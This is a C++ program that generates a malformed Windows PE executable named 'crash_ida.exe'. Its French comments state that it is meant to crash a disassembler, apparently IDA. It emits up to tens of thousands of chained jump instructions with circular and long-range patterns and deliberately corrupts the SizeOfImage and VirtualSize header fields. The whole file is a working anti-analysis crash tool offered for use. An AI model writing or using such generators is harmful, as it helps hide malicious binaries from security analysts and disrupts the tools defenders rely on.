#include <stdint.h>
#include <vector>
#include <fstream>
#include <iostream>
#include <cstdlib>
#include <cstring>

#ifndef INT32_MIN
#define INT32_MIN (-2147483647 - 1)
#endif
#ifndef INT32_MAX
#define INT32_MAX 2147483647
#endif

struct DOSHeader {
    uint16_t e_magic;
    uint8_t  padding[58];
    uint32_t e_lfanew;
};

struct PEHeader {
    uint32_t signature;
    uint16_t machine;
    uint16_t numberOfSections;
    uint32_t timeDateStamp;
    uint32_t pointerToSymbolTable;
    uint32_t numberOfSymbols;
    uint16_t sizeOfOptionalHeader;
    uint16_t characteristics;
};

struct OptionalHeader64 {
    uint16_t magic;
    uint8_t  majorLinkerVersion;
    uint8_t  minorLinkerVersion;
    uint32_t sizeOfCode;
    uint32_t sizeOfInitializedData;
    uint32_t sizeOfUninitializedData;
    uint32_t addressOfEntryPoint;
    uint32_t baseOfCode;
    uint64_t imageBase;
    uint32_t sectionAlignment;
    uint32_t fileAlignment;
    uint16_t majorOperatingSystemVersion;
    uint16_t minorOperatingSystemVersion;
    uint16_t majorImageVersion;
    uint16_t minorImageVersion;
    uint16_t majorSubsystemVersion;
    uint16_t minorSubsystemVersion;
    uint32_t win32VersionValue;
    uint32_t sizeOfImage;
    uint32_t sizeOfHeaders;
    uint32_t checkSum;
    uint16_t subsystem;
    uint16_t dllCharacteristics;
    uint64_t sizeOfStackReserve;
    uint64_t sizeOfStackCommit;
    uint64_t sizeOfHeapReserve;
    uint64_t sizeOfHeapCommit;
    uint32_t loaderFlags;
    uint32_t numberOfRvaAndSizes;
    uint8_t dataDirectories[16 * 8];
};

struct SectionHeader {
    char     name[8];
    uint32_t virtualSize;
    uint32_t virtualAddress;
    uint32_t sizeOfRawData;
    uint32_t pointerToRawData;
    uint32_t pointerToRelocations;
    uint32_t pointerToLinenumbers;
    uint16_t numberOfRelocations;
    uint16_t numberOfLinenumbers;
    uint32_t characteristics;
};

int main(int argc, char** argv){
    int N = 50000; // AUGMENTÉ pour forcer le crash

    if(argc >= 2) N = std::atoi(argv[1]);

    if (N <= 0) {
        std::cerr << "N must be > 0\n";
        return 1;
    }

    std::cout << "Generating crash_ida.exe with N = " << N << " jumps\n";

    const size_t JMP_SIZE = 5;
    const uint32_t IMAGE_BASE = 0x400000;
    const uint32_t SECTION_ALIGN = 0x1000;
    const uint32_t FILE_ALIGN = 0x200;

    std::vector<uint8_t> code;
    code.resize(N * JMP_SIZE);

    std::vector<uint8_t> payload;
    for(int i=0; i<16; i++) payload.push_back(0x90);
    payload.push_back(0x48); payload.push_back(0x31); payload.push_back(0xC0);
    payload.push_back(0xC3);

    size_t payload_offset = code.size();
    code.insert(code.end(), payload.begin(), payload.end());

    uint32_t code_rva = 0x1000;

    // TECHNIQUE DE CRASH : Jumps avec patterns circulaires
    for(int j=0; j<N; j++){
        size_t file_off = j * JMP_SIZE;
        uint64_t va_jmp = IMAGE_BASE + code_rva + file_off;
        uint64_t addr_next = va_jmp + JMP_SIZE;

        uint64_t target_va;

        // Pattern 1 : Tous les 50 jumps, retour en arrière (boucles)
        if(j > 50 && j % 50 == 0) {
            target_va = IMAGE_BASE + code_rva + ((j - 25) * JMP_SIZE);
        }
        // Pattern 2 : Tous les 100 jumps, grand saut en avant
        else if(j % 100 == 0 && j < N - 500) {
            target_va = IMAGE_BASE + code_rva + ((j + 500) * JMP_SIZE);
        }
        // Pattern 3 : Séquence normale
        else if(j < N-1){
            target_va = IMAGE_BASE + code_rva + ((j+1) * JMP_SIZE);
        }
        else {
            target_va = IMAGE_BASE + code_rva + payload_offset;
        }

        int64_t rel = (int64_t)target_va - (int64_t)addr_next;

        if(rel < INT32_MIN || rel > INT32_MAX){
            std::cerr << "ERROR: rel32 out of range\n";
            return 2;
        }

        int32_t rel32 = (int32_t)rel;

        code[file_off + 0] = 0xE9;
        code[file_off + 1] = (uint8_t)(rel32 & 0xFF);
        code[file_off + 2] = (uint8_t)((rel32 >> 8) & 0xFF);
        code[file_off + 3] = (uint8_t)((rel32 >> 16) & 0xFF);
        code[file_off + 4] = (uint8_t)((rel32 >> 24) & 0xFF);
    }

    size_t code_size_aligned = ((code.size() + FILE_ALIGN - 1) / FILE_ALIGN) * FILE_ALIGN;
    code.resize(code_size_aligned, 0x00);

    std::vector<uint8_t> exe;

    DOSHeader dos = {0};
    dos.e_magic = 0x5A4D;
    dos.e_lfanew = 0x80;
    exe.insert(exe.end(), (uint8_t*)&dos, (uint8_t*)&dos + sizeof(dos));
    exe.resize(0x80, 0x00);

    PEHeader pe = {0};
    pe.signature = 0x00004550;
    pe.machine = 0x8664;
    pe.numberOfSections = 1;
    pe.sizeOfOptionalHeader = sizeof(OptionalHeader64);
    pe.characteristics = 0x0022;
    exe.insert(exe.end(), (uint8_t*)&pe, (uint8_t*)&pe + sizeof(pe));

    OptionalHeader64 opt = {0};
    opt.magic = 0x20B;
    opt.sizeOfCode = code.size();
    opt.addressOfEntryPoint = code_rva;
    opt.baseOfCode = code_rva;
    opt.imageBase = IMAGE_BASE;
    opt.sectionAlignment = SECTION_ALIGN;
    opt.fileAlignment = FILE_ALIGN;
    opt.majorOperatingSystemVersion = 6;
    opt.majorSubsystemVersion = 6;

    // CORRUPTION 1 : SizeOfImage exagéré
    opt.sizeOfImage = 0x10000000; // 256 MB virtuel

    opt.sizeOfHeaders = FILE_ALIGN;
    opt.subsystem = 3;
    opt.numberOfRvaAndSizes = 16;
    exe.insert(exe.end(), (uint8_t*)&opt, (uint8_t*)&opt + sizeof(opt));

    SectionHeader sect = {0};
    memcpy(sect.name, ".text", 5);
    sect.virtualSize = code.size() * 2; // CORRUPTION 2 : VirtualSize > RawSize
    sect.virtualAddress = code_rva;
    sect.sizeOfRawData = code.size();
    sect.pointerToRawData = FILE_ALIGN;
    sect.characteristics = 0x60000020;
    exe.insert(exe.end(), (uint8_t*)&sect, (uint8_t*)&sect + sizeof(sect));

    exe.resize(FILE_ALIGN, 0x00);
    exe.insert(exe.end(), code.begin(), code.end());

    std::ofstream ofs("crash_ida.exe", std::ios::binary);
    if(!ofs){
        std::cerr << "Cannot create crash_ida.exe\n";
        return 3;
    }
    ofs.write((const char*)&exe[0], exe.size());
    ofs.close();

    std::cout << "Created crash_ida.exe (" << exe.size() << " bytes)\n";
    std::cout << "Code size: " << code.size() << " bytes\n";
    std::cout << "Entry point RVA: 0x" << std::hex << code_rva << std::dec << "\n";
    std::cout << "\nCrash techniques used:\n";
    std::cout << "- " << N << " jumps (high volume)\n";
    std::cout << "- Circular jumps every 50 instructions\n";
    std::cout << "- Large forward jumps every 100 instructions\n";
    std::cout << "- Corrupted PE headers (SizeOfImage, VirtualSize)\n";

    return 0;
}